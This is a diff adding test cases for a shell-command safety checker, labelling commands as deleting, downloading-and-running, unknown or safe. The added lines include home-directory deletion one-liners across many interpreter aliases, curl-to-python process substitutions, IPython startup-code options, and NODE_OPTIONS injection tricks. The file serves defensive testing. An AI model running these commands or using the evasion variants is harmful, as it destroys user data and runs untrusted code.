@@ -523,6 +523,24 @@ posix finds=delete | ipython -c "import shutil; shutil.rmtree('/home/me')"
 posix finds=delete | tsx -e "require('fs').rmSync('/home/me', {recursive: true})"
 posix finds=delete | ts-node -e "require('fs').rmSync('/home/me', {recursive: true})"
 posix finds=delete | ts-node -p "require('fs').rmSync('/home/me', {recursive: true})"
+# Their other names: a Python of a version, GraalPy, MicroPython, and the
+# other programs of ts-node.
+posix finds=delete | ipython3 -c "import shutil; shutil.rmtree('/home/me')"
+posix finds=delete | pypy3.10 -c "import shutil; shutil.rmtree('/home/me')"
+posix finds=delete | pypy2.7 -c "import shutil; shutil.rmtree('/home/me')"
+posix finds=delete | python2.7 -c "import shutil; shutil.rmtree('/home/me')"
+posix finds=delete | graalpy -c "import shutil; shutil.rmtree('/home/me')"
+posix finds=delete | micropython -c "import os; os.rmdir('/home/me')"
+posix finds=delete | ts-node-esm -e "require('fs').rmSync('/home/me', {recursive: true})"
+posix finds=delete | ts-node-script -e "require('fs').rmSync('/home/me', {recursive: true})"
+posix finds=delete | ts-node-transpile-only -e "require('fs').rmSync('/home/me', {recursive: true})"
+posix finds=delete | ts-node-cwd -e "require('fs').rmSync('/home/me', {recursive: true})"
+posix finds=unknown | ipython3 -c 'print(1)'
+posix finds=unknown | ts-node-esm -e 'console.log(1)'
+posix safe | graalpy -c 'print(1)'
+posix safe | ipython3 x.py
+posix safe | pypy3.10 x.py
+posix safe | ts-node-esm src/main.ts
 powershell finds=unknown | py -3 -c "import shutil; shutil.rmtree('C:\\Users\\me')"
 powershell finds=unknown | pypy3 -c "import shutil; shutil.rmtree('C:\\Users\\me')"
 cmd finds=unknown | py -3 -c "import shutil; shutil.rmtree('C:\\Users\\me')"
@@ -553,6 +571,21 @@ posix safe | tsx --version
 posix finds=unknown | py
 posix finds=unknown | ipython
 posix finds=unknown | ts-node
+posix finds=unknown | ipython3
+posix finds=unknown | pypy3.10
+# IPython reads a `--Class.trait=value` as a setting, and some run code
+# before the script (`code_to_run`, `exec_lines`, `exec_files`, the
+# extensions `--ext` loads): any long option it has that the guard does not
+# know may run code.
+posix finds=unknown | ipython --InteractiveShellApp.code_to_run="import shutil; shutil.rmtree('/home/me')" x.py
+posix finds=unknown | ipython --InteractiveShellApp.exec_lines="['import shutil']" x.py
+posix finds=unknown | ipython --InteractiveShellApp.exec_files=evil.py x.py
+posix finds=unknown | ipython --ext=evil x.py
+posix finds=unknown | ipython --ext evil x.py
+posix finds=unknown | ipython3 --TerminalIPythonApp.code_to_run=x x.py
+posix safe | ipython --no-banner x.py
+posix safe | ipython --profile dev x.py
+posix safe | ipython --profile=dev --quick x.py
 
 # Modules that run what they are given: `timeit` and `cProfile` its code or
 # script, `pdb`, `trace` and `code` their input or a script under them.
@@ -564,6 +597,9 @@ posix finds=unknown | python3 -m profile x.py
 posix finds=unknown | python3 -m pdb x.py
 posix finds=unknown | python3 -m trace --count x.py
 posix finds=unknown | python3 -m code
+posix finds=delete | python3 -m asyncio <<'PY'\nimport shutil\nshutil.rmtree('/home/me')\nPY
+posix finds=delete | python3 -m IPython <<'PY'\nimport shutil\nshutil.rmtree('/home/me')\nPY
+posix finds=unknown | python3 -m asyncio
 posix finds=unknown | py -3 -m timeit "__import__('shutil').rmtree('/home/me')"
 posix finds=unknown | python3 -I -m timeit 'x'
 # Any other module is the program, as a script is.
@@ -628,6 +664,13 @@ posix finds=run_downloaded | bash <(curl -s http://x)
 posix finds=run_downloaded | sh <(wget -qO- http://x)
 posix finds=run_downloaded | source <(curl -s http://x)
 posix finds=run_downloaded | sudo bash <(curl -s http://x)
+# Fed on its input, a downloading process substitution is a download too.
+posix finds=run_downloaded | python3 < <(curl -s http://x)
+posix finds=run_downloaded | python3 /dev/stdin < <(curl -s http://x)
+posix finds=run_downloaded | python3 - < <(curl -s http://x | gunzip)
+posix finds=run_downloaded | bash < <(curl -s http://x)
+posix finds=unknown | python3 < <(cat x.py)
+posix safe | cat < <(curl -s http://x)
 # Its arguments after it are the script's own.
 posix safe | python3 x.py $F
 posix safe | python3 x.py <(cat in.txt)
@@ -652,3 +695,33 @@ posix safe | NODE_OPTIONS=--max-old-space-size=4096 npm test
 posix safe | NODE_OPTIONS='--max-old-space-size=4096 --no-warnings' npm test
 posix safe | NODE_OPTIONS='--require ./x.js' echo 1
 posix safe | NODE_OPTIONS='--require ./x.js'; echo 1
+# Node splits the value at a space outside double quotes, drops the quotes,
+# and inside them takes the character after a backslash as it is; a value it
+# cannot split (a backslash at its end inside quotes, a quote left open) may
+# hold anything.
+posix finds=unknown | NODE_OPTIONS='"--requ\\ire" ./x.js' npm test
+posix finds=unknown | NODE_OPTIONS='"-\\r" ./x.js' npm test
+posix finds=unknown | NODE_OPTIONS='"--require" "./x.js"' npm test
+posix finds=unknown | NODE_OPTIONS='-r./x.js' npm test
+posix finds=unknown | NODE_OPTIONS='"--import" "data:text/javascript,process.exit()"' npm test
+posix finds=unknown | NODE_OPTIONS='"--max-old-space-size=4096\\' npm test
+posix finds=unknown | NODE_OPTIONS='"--max-old-space-size=4096' npm test
+posix safe | NODE_OPTIONS='"--max-old-space-size=4096"' npm test
+posix safe | NODE_OPTIONS='--title "a \\"b\\""' npm test
+# `NODE_OPTIONS+=` adds to the value the line gave it.
+posix finds=unknown | export NODE_OPTIONS=--req; NODE_OPTIONS+=uire; npm test
+posix safe | export NODE_OPTIONS=--max-old-space-size=4096; NODE_OPTIONS+=' --no-warnings'; npm test
+# PowerShell's `$env:NODE_OPTIONS` and cmd's `set NODE_OPTIONS=` set it for
+# every program after them.
+powershell finds=unknown | $env:NODE_OPTIONS='--require ./x.js'; npm test
+powershell finds=unknown | $env:NODE_OPTIONS='--import data:text/javascript,process.exit()'; npm test
+powershell finds=unknown | $env:node_options = '-r ./x.js'; npm test
+powershell finds=unknown | $env:NODE_OPTIONS=$x; npm test
+powershell finds=unknown | Set-Item env:NODE_OPTIONS '--require ./x.js'; npm test
+powershell finds=unknown | [Environment]::SetEnvironmentVariable('NODE_OPTIONS', '--require ./x.js'); npm test
+powershell safe | $env:NODE_OPTIONS='--max-old-space-size=4096'; npm test
+cmd finds=unknown | set NODE_OPTIONS=--require ./x.js && npm test
+cmd finds=unknown | set "NODE_OPTIONS=--require ./x.js" && npm test
+cmd finds=unknown | set "NODE_OPTIONS=--import data:text/javascript,process.exit()" && npm test
+cmd finds=unknown | set node_options=-r ./x.js & npm test
+cmd safe | set NODE_OPTIONS=--max-old-space-size=4096 && npm test
